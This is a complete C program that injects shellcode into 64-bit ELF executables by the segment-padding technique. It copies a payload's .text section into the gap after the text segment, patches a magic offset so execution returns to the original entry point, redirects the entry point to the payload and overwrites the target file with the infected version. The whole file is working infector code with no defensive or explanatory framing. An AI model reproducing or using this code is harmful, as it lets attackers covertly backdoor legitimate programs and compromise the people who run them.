#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <string.h>
#include <unistd.h>
#include <elf.h>
#include <sys/mman.h>
#include <sys/stat.h>

void *mapFile(const char *path, long *filesize)
{
    FILE *file = fopen(path, "rb");
    int fd;
    void *content;

    if (!file)
    {
        perror("fopen error:");
        exit(EXIT_FAILURE);
    }

    if (fseek(file, 0, SEEK_END) == -1)
    {
        fclose(file);
        perror("fseek error:");
        exit(EXIT_FAILURE);
    }

    fd = fileno(file);

    if (fd == -1)
    {
        fclose(file);
        perror("fileno error:");
        exit(EXIT_FAILURE);
    }

    *filesize = ftell(file);
    rewind(file);

    if (content = mmap(NULL, *filesize, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0), content == MAP_FAILED)
    {
        fclose(file);
        perror("mmap error:");
        exit(EXIT_FAILURE);
    }

    fclose(file);
    printf("[+] %s was mapped into memory.\n", path);
    return content;
}

void freeContent(void *content, long filesize)
{
    if (munmap(content, filesize) == 0)
    {
        printf("[+] The block memory of size %ld bytes was deallocated from the memory.\n", filesize);
    }
}

void extractSegmentsBoundaries(Elf64_Ehdr *elf_headers, Elf64_Phdr *prog_headers, Elf64_Xword *newEP, Elf64_Xword *text_segment_end, Elf64_Xword *gap)
{
    for (int i = 0; i < elf_headers->e_phnum; ++i, prog_headers = (Elf64_Phdr *)((unsigned char *)prog_headers + elf_headers->e_phentsize))
    {
        if (prog_headers->p_type == PT_LOAD)
        {
            prog_headers->p_flags |= PF_W;

            if (prog_headers->p_flags == (PF_W | PF_X | PF_R))
            {
                *newEP = prog_headers->p_vaddr + prog_headers->p_filesz;
                *text_segment_end = prog_headers->p_filesz;
            }
            else if (prog_headers->p_flags == (PF_R | PF_W))
            {
                *gap = prog_headers->p_offset - *text_segment_end;
            }
        }
    }
}

void extendTextSegment(Elf64_Ehdr *elf_headers, Elf64_Phdr *prog_headers, Elf64_Xword size)
{
    for (int i = 0; i < elf_headers->e_phnum; ++i, prog_headers = (Elf64_Phdr *)((unsigned char *)prog_headers + elf_headers->e_phentsize))
    {
        if (prog_headers->p_type == PT_LOAD)
        {
            if (prog_headers->p_flags == (PF_W | PF_X | PF_R))
            {
                printf("[+] Extended the filesz and the memsz with 0x%lx\n", size);
                prog_headers->p_filesz += size;
                prog_headers->p_memsz += size;
                prog_headers->p_flags = PF_X | PF_R; // restore original .text segment flags
                break;
            }
        }
    }
}

void parseSections(Elf64_Ehdr *elf_headers, Elf64_Shdr *sec_hdrs, char *section_mem, Elf64_Off *text_sec_init, Elf64_Xword *text_sec_end, Elf64_Xword *text_sec_size, const char *toParse)
{
    if (elf_headers->e_shnum == 0 || elf_headers->e_shstrndx == 0)
    {
        puts("[-] It doesn't have sections.");
        return;
    }

    for (int i = 1; i < elf_headers->e_shnum; ++i)
    {
        if (strncmp(&section_mem[sec_hdrs[i].sh_name], toParse, strlen(toParse)) == 0)
        {
            printf("[+] Found %s section at 0x%lx\n", toParse, sec_hdrs[i].sh_offset);
            *text_sec_init = sec_hdrs[i].sh_offset;
            *text_sec_size = sec_hdrs[i].sh_size;
            *text_sec_end = *text_sec_init + *text_sec_size;
            printf("[+] %s end at 0x%lx, and has the size of 0x%lx\n", toParse, *text_sec_end, *text_sec_size);
            break;
        }
    }
}

void writeNewFile(char *content, long filesize)
{
    FILE *file;
    file = fopen("example-cp", "wb");

    if (!file)
    {
        freeContent(content, filesize);
        perror("fopen error:");
        exit(EXIT_FAILURE);
    }

    fwrite(content, filesize, 1, file);
    puts("[+] The new file was created.");
    fclose(file);
}

bool isElf(char *content, Elf64_Ehdr *elf_headers)
{
    if (content[0] == 0x7f && strncmp(&content[1], "ELF", 3) == 0)
    {
        return true;
    }

    return false;
}

short isExec(uint16_t type)
{
    switch (type)
    {
    case ET_DYN:
        puts("[+] Dynamic linked elf.");
        return 0;
    case ET_EXEC:
        puts("[+] Static linked elf.");
        return 1;
    }

    return 2;
}

void injectElf(char *content, long filesize, const char *shellcodePath)
{
    Elf64_Ehdr *elf_headers = (Elf64_Ehdr *)content, *shell_elf_headers;

    if (!isElf(content, elf_headers))
    {
        freeContent(content, filesize);
        perror("[-] The file isn't an elf");
        exit(EXIT_FAILURE);
    }

    Elf64_Phdr *prog_headers = (Elf64_Phdr *)((unsigned char *)elf_headers + elf_headers->e_phoff);
    Elf64_Shdr *section_headers = (Elf64_Shdr *)((unsigned char *)elf_headers + elf_headers->e_shoff), *shell_section_headers;
    Elf64_Addr oep = elf_headers->e_entry;
    Elf64_Xword newEP = 0, text_segment_end = 0, gap = 0, text_sec_end = 0, text_sec_size = 0, shell_text_sec_end = 0, shell_text_sec_size = 0;
    Elf64_Off text_sec_init = 0, shell_text_sec_init = 0;
    long shellcode_size = 0;
    short isStatic;
    char *section_mem = &content[section_headers[elf_headers->e_shstrndx].sh_offset], *shellcodeContent, *shell_sec_mem;

    extractSegmentsBoundaries(elf_headers, prog_headers, &newEP, &text_segment_end, &gap);

    printf("[+] The OEP is 0x%lx\n", oep);
    printf("[+] The gap has %ld bytes\n", gap);

    parseSections(elf_headers, section_headers, section_mem, &text_sec_init, &text_sec_end, &text_sec_size, ".text");

    shellcodeContent = mapFile(shellcodePath, &shellcode_size);
    shell_elf_headers = (Elf64_Ehdr *)shellcodeContent;

    if (!isElf(shellcodeContent, shell_elf_headers))
    {
        freeContent(content, filesize);
        freeContent(shellcodeContent, shellcode_size);
        perror("[-] The file isn't an elf");
        exit(EXIT_FAILURE);
    }

    if (shellcode_size > gap)
    {
        freeContent(content, filesize);
        freeContent(shellcodeContent, shellcode_size);
        perror("[-] The shellcode size is larger than gap:");
        exit(EXIT_FAILURE);
    }

    shell_section_headers = (Elf64_Shdr *)((unsigned char *)shell_elf_headers + shell_elf_headers->e_shoff);
    shell_sec_mem = &shellcodeContent[shell_section_headers[shell_elf_headers->e_shstrndx].sh_offset];

    parseSections(shell_elf_headers, shell_section_headers, shell_sec_mem, &shell_text_sec_init, &shell_text_sec_end, &shell_text_sec_size, ".text");
    memmove(&content[text_segment_end], &shellcodeContent[shell_text_sec_init], shell_text_sec_size);
    printf("[+] The shellcode was copied to offset 0x%lx\n", text_segment_end);
    freeContent(shellcodeContent, shellcode_size);
    isStatic = isExec(elf_headers->e_type);

    // patch magic offset
    for (uint64_t i = 0; i < shell_text_sec_size; ++i)
    {
        if (isStatic)
        {
            if (*(unsigned int *)(content + text_segment_end + i) == 0xbee) // restore oep
            {
                printf("[+] Found magic offset 0x%x\n", *(unsigned int *)(content + text_segment_end + i));
                *(uint32_t *)(content + text_segment_end + i) = (uint32_t)oep;
                printf("[+] Magic offset patched with value 0x%x\n", *(unsigned int *)(content + text_segment_end + i));
            }
        }
        else if (isStatic == 0) // dynamic-linked elf
        {
            if (*(unsigned int *)(content + text_segment_end + i) == 0xbee) // get distance to oep
            {
                printf("[+] Found magic offset 0x%x\n", *(unsigned int *)(content + text_segment_end + i));
                *(uint32_t *)(content + text_segment_end + i) = (uint32_t)(text_segment_end - oep);
                printf("[+] Magic offset patched with value 0x%x\n", *(unsigned int *)(content + text_segment_end + i));
            }
        }
        else
        {
            freeContent(content, filesize);
            perror("[-] Option invalid");
            exit(EXIT_FAILURE);
        }
    }

    elf_headers->e_entry = newEP;
    extendTextSegment(elf_headers, prog_headers, shell_text_sec_size);
    printf("[+] Patched entry point: 0x%lx\n", elf_headers->e_entry);

    writeNewFile(content, filesize);
    freeContent(content, filesize);
}

int main(int argc, char **argv)
{
    if (argc != 3)
    {
        fprintf(stderr, "Usage %s <file> <shellcode>\n", *argv);
        return 1;
    }

    const char *path = argv[1];
    const char *shellcodePath = argv[2];
    char *content;
    long filesize = 0;

    content = mapFile(path, &filesize);
    injectElf(content, filesize, shellcodePath);

    if (rename("example-cp", path) == -1)
        return 1;

    if (chmod(path, S_IRUSR | S_IXUSR) == -1)
        return 1;
    return 0;
}
